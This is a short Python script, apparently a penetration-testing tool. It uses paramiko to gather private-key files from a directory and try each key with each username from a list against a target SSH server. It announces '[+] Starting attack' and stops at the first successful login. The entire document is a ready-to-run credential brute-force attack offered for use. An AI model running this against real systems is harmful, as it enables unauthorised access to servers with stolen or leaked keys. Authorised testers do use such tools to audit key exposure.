#!/usr/bin/env python3

import argparse
import paramiko
import sys
import os

def test(target, username, key):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
      print('  [+] Trying %s:%s' % (username, key))
      ssh.connect(target, username=username, key_filename=key)
      print('    [+] Success!')
      sys.exit()
    except paramiko.ssh_exception.SSHException:
      pass
    except ValueError:
      print('    [-] Issue with key file. Probably unsupported keylength')
    except KeyboardInterrupt:
      ssh.close()
      sys.exit(0)
    except Exception as e:
      print('    [-] Unknown issue with key')
      print('      ' % e)
    finally:
      ssh.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', '-t', type=str, required=True)
    parser.add_argument('--users', '-u', type=str, required=True)
    parser.add_argument('--keys', '-k', type=str, required=True)
    args = parser.parse_args()

    files_dir = []
    keys = []
    users_len = 0

    print('[+] Building list of keys in \"%s\" directory' % args.keys)
    for dirpath, subdirs, files in os.walk(args.keys):
      files_dir.extend(os.path.join(dirpath, x) for x in files)

    for f in files_dir:
      with open(f) as keyfile:
        try:
          if ' PRIVATE KEY-----' in keyfile.readlines()[0]:
            keys.append(f)
        except (UnicodeDecodeError, IndexError):
          pass

    for line in open(args.users).readlines():
        users_len += 1
    print('  [+] Testing %s keys and %s users' % (len(keys), users_len))
    print('[+] Starting attack')
    for k in keys:
      try:
        for username in open(args.users).readlines():
          test(args.target, username.strip(), k)
      except Exception as e:
        print('  [!] Unknown Key error. Skipping all usernames for %s' % k)
        print('    %s' % e)

if __name__ == '__main__':
    main()
